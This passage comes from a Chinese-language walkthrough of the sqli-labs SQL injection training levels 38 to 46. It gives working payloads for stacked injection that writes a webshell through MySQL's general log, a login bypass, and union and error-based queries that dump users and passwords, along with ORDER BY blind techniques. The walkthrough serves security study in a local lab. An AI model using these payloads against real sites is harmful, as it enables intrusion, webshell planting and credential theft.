+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;set global general_log = &#34;ON&#34;;set global general_log_file=&#39;</span><span class="n">D</span><span class="p">:</span><span class="o">/</span><span class="n">phpstudy_pro</span><span class="o">/</span><span class="n">WWW</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">pl</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">38</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;;--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后 MySQL 再查看日志配置是否被修改了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                                         </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">ON</span><span class="w">                                            </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">D</span><span class="p">:</span><span class="o">/</span><span class="n">phpstudy_pro</span><span class="o">/</span><span class="n">WWW</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">pl</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">38</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">warning</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个尝试 getshell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;select &#34;&lt;?php phpinfo();?&gt;&#34;;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p>
+<p><img src="/p/cjxjnagt/02.png"
+	width="1852"
+	height="768"
+	srcset="/p/cjxjnagt/02_hud8e35a3d252ca0feef8c82966fc250bb_95629_480x0_resize_box_3.png 480w, /p/cjxjnagt/02_hud8e35a3d252ca0feef8c82966fc250bb_95629_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-38_开启日志 Getshell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="578px"
+	
+></p>
+<p><code>shell.php</code>日志文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">D:\phpstudy_pro\COM\..\Extensions\MySQL8.0.12\\bin\mysqld.exe, Version: 8.0.12 (MySQL Community Server - GPL). started with:
+</span></span><span class="line"><span class="cl">TCP Port: 3306, Named Pipe: MySQL
+</span></span><span class="line"><span class="cl">Time                 Id Command    Argument
+</span></span><span class="line"><span class="cl">2020-12-08T02:16:42.153350Z	   10 Query	-- &#39; LIMIT 0,1
+</span></span><span class="line"><span class="cl">2020-12-08T02:16:44.267004Z	   11 Connect	root@localhost on security using TCP/IP
+</span></span><span class="line"><span class="cl">2020-12-08T02:16:44.267240Z	   11 Init DB	security
+</span></span><span class="line"><span class="cl">2020-12-08T02:16:44.267398Z	   11 Query	SELECT * FROM users WHERE id=&#39;1&#39;;
+</span></span><span class="line"><span class="cl">2020-12-08T02:16:44.267695Z	   11 Query	select &#34;&lt;?php phpinfo();?&gt;&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-39">Less-39</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;ON&#34;</span><span class="p">;</span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="o">=</span><span class="s1">&#39;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php&#39;</span><span class="p">;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;select &#34;&lt;?php phpinfo();?&gt;&#34;;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-40">Less-40</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=('$id')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-38 相比只是拼接方式不一样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;);set global general_log = &#34;ON&#34;;set global general_log_file=&#39;</span><span class="n">D</span><span class="p">:</span><span class="o">/</span><span class="n">phpstudy_pro</span><span class="o">/</span><span class="n">WWW</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">pl</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">40</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="p">);</span><span class="k">select</span><span class="w"> </span><span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p>
+<h2 id="less-41">Less-41</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。</p>
+<h2 id="less-42">Less-42</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username='$username'</code></td>
+</tr>
+</tbody>
+</table></div>
+<ul>
+<li><code>index.php</code></li>
+</ul>
+<p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p>
+<ul>
+<li><code>forgot_password.php</code></li>
+</ul>
+<p>if you forgot your password,go to hack it</p>
+<ul>
+<li><code>acc-create.php</code></li>
+</ul>
+<p>if you need to create account,then hack your way in</p>
+<ul>
+<li><code>failed.php</code></li>
+</ul>
+<p>Bug off you silly dump hacker</p>
+<ul>
+<li><code>login.php</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># username 被过滤 &#39; &#34; \ password 没有被
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$username</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_user&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_password&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 堆叠查询
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_multi_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">查询成功：</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">登录成功</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">跳转到</span> <span class="nx">logged</span><span class="o">-</span><span class="nx">in</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>logged-in.php</code></li>
+</ul>
+<p>登录成功，提供修改密码的表单</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Html" data-lang="Html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;mylogin&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;pass_change.php&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>pass_change.php</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">没有登录</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">重定向到</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">提交了修改密码表单</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$curr_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;current_password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$re_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nv">$pass</span><span class="o">==</span><span class="nv">$re_pass</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET PASSWORD=&#39;</span><span class="si">$pass</span><span class="s2">&#39; where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$curr_pass</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p>
+<p>经典的<strong>万能密码</strong>绕过 <code>1' or 1#</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Http" data-lang="Http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/Less-42/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">login_user=admin&amp;login_password=1&#39; or 1#&amp;mysubmit=Login
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为登录成功后返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以登录了 id 为 1 的 Dumb 用户：</p>
+<p>尝试<strong>联合查询</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Http" data-lang="Http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/Less-42/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">login_user=admin&amp;login_password=13141&#39; union select 1,(select group_concat(username,&#34;:&#34;,password,0x3c62723e) from users),3#&amp;mysubmit=Login
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cjxjnagt/03.png"
+	width="1579"
+	height="811"
+	srcset="/p/cjxjnagt/03_hud8b6824537993006df312c5416638a7d_118181_480x0_resize_box_3.png 480w, /p/cjxjnagt/03_hud8b6824537993006df312c5416638a7d_118181_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-42"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p><strong>报错注入</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">login_user=admin&amp;login_password=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;mysubmit=Login
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cjxjnagt/04.png"
+	width="1414"
+	height="465"
+	srcset="/p/cjxjnagt/04_hu2188dcd0c8deb1e516b8eaedd8b9e30a_106172_480x0_resize_box_3.png 480w, /p/cjxjnagt/04_hu2188dcd0c8deb1e516b8eaedd8b9e30a_106172_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-42"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="729px"
+	
+></p>
+<p>同理这里也可以进行盲注和堆叠查注入，这里不再赘述。</p>
+<h2 id="less-43">Less-43</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username=('$username')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p>
+<h2 id="less-44">Less-44</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username='$username'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
+<h2 id="less-45">Less-45</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username=('$username')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p>
+<h2 id="less-46order-by后的注入">Less-46(order by后的注入)</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody>
+</table></div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># GET 方式获取 sort 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 直接将 id 带入 SQL 中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users ORDER BY </span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">查询成功：</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出查询信息</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="nx">：</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p>
+<h3 id="验证方式">验证方式</h3>
+<ul>
+<li><strong>升序和降序验证</strong></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1"># 升序排序</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=</span><span class="m">1</span> asc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 降序排序</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=</span><span class="m">1</span> dasc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>rand() 验证</strong></li>
+</ul>
+<p>rand(ture) 和 rand(false) 的结果是不一样的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">?sort<span class="o">=</span>rand<span class="o">(</span><span class="nb">true</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=</span>rand<span class="o">(</span><span class="nb">false</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
+<p>此外 rand() 结果是一直都是随机的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">?sort<span class="o">=</span>rand<span class="o">()</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=</span><span class="m">1</span> and rand<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>延时验证</strong></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?sort<span class="o">=</span>sleep<span class="o">(</span>1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=(</span>sleep<span class="o">(</span>1<span class="o">))</span>
+</span></span><span class="line"><span class="cl">?sort<span class="o">=</span><span class="m">1</span> and sleep<span class="o">(</span>1<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p>
+<h3 id="报错注入">报错注入</h3>
+<h4 id="爆数据库">爆数据库</h4>
+<p><code>?sort=1 and updatexml(1,concat('~',(select group_concat(schema_name)from information_schema.schemata)),0)</code></p>
+<p><img src="/p/cjxjnagt/05.png"
+	width="1211"
+	height="323"
+	srcset="/p/cjxjnagt/05_hu2f19f62c6b4e90343ff10eb813833483_31317_480x0_resize_box_3.png 480w, /p/cjxjnagt/05_hu2f19f62c6b4e90343ff10eb813833483_31317_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="374"
+		data-flex-basis="899px"
+	
+>可见一次把数据库名爆不完，所以可以采用<code>limit</code>语句控制一次爆库名的个数</p>
+<p><code>?sort=1 and updatexml(1,concat('~',(select schema_name from information_schema.schemata limit 4,1)),0)</code>
+<img src="/p/cjxjnagt/06.png"
+	width="1142"
+	height="338"
+	srcset="/p/cjxjnagt/06_hu965166052bed259bfcceb196071be540_30376_480x0_resize_box_3.png 480w, /p/cjxjnagt/06_hu965166052bed259bfcceb196071be540_30376_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="810px"
+	
+></p>
+<h4 id="爆表">爆表</h4>
+<p><code>?sort=1 and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema='security')),0)</code>
+<img src="/p/cjxjnagt/07.png"
+	width="1365"
+	height="342"
+	srcset="/p/cjxjnagt/07_huaa04a5031f851754d4f9c0a5fce73d92_33692_480x0_resize_box_3.png 480w, /p/cjxjnagt/07_huaa04a5031f851754d4f9c0a5fce73d92_33692_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="399"
+		data-flex-basis="957px"
+	
+></p>
+<h4 id="爆users表的表列">爆<code>users</code>表的表列</h4>
+<p><code>?sort=1 and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')),0)</code>
+<img src="/p/cjxjnagt/08.png"
+	width="1559"
+	height="317"
